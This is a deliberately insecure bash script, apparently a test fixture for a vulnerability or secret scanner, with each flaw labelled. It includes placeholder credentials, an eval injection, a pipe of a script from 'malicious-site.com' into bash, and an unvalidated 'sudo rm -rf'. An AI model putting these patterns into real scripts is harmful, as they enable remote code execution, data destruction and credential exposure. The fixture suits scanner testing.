#!/bin/bash
# Vulnerable Shell Script - FOR TESTING PURPOSES ONLY

# VULNERABILITY: Hardcoded credentials
export DB_PASSWORD="SuperSecret123!"
export API_KEY="sk_1234567890abcdefghijklmnop"
export AWS_ACCESS_KEY="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# VULNERABILITY: Command injection vulnerability
USER_INPUT=$1
eval "echo $USER_INPUT"  # Dangerous eval

# VULNERABILITY: Insecure curl usage
curl -k https://api.example.com/data  # -k disables SSL verification

# VULNERABILITY: Downloading and executing scripts from internet
curl https://malicious-site.com/script.sh | bash

# VULNERABILITY: Weak file permissions
chmod 777 /app/config.yml
chmod 777 /var/log/app.log

# VULNERABILITY: Storing secrets in plain text files
echo "password123" > /tmp/db_password.txt
echo "AKIAIOSFODNN7EXAMPLE" > /tmp/aws_key.txt

# VULNERABILITY: Running commands as root without validation
sudo rm -rf $USER_INPUT  # Dangerous - no input validation

# VULNERABILITY: Exposing secrets in logs
echo "Connecting with password: SuperSecret123!"

# VULNERABILITY: Insecure SSH configuration
ssh -o StrictHostKeyChecking=no user@host

# VULNERABILITY: Hardcoded GitHub token
GITHUB_TOKEN="ghp_1234567890abcdefghijklmnopqrstuvwxyz"
git clone https://$GITHUB_TOKEN@github.com/user/repo.git

# VULNERABILITY: Slack webhook hardcoded
SLACK_WEBHOOK="https://hooks.slack.com/services/T00/B00/XXXX"
curl -X POST -H 'Content-type: application/json' \
  --data '{"text":"Deployment completed"}' \
  $SLACK_WEBHOOK

# VULNERABILITY: SQL command with credentials
mysql -h localhost -u admin -p"admin123" testdb -e "SELECT * FROM users"

# VULNERABILITY: MongoDB with credentials in connection string
mongodump --uri="mongodb://admin:password123@localhost:27017/mydb"

# VULNERABILITY: Redis with password
redis-cli -h localhost -a "weak_redis_password" SET mykey "value"

# VULNERABILITY: Docker login with credentials
echo "MyDockerPassword123" | docker login -u myuser --password-stdin

# VULNERABILITY: NPM publish with token
npm config set //registry.npmjs.org/:_authToken npm_1234567890abcdefghijklmnopqrstuvwxyz

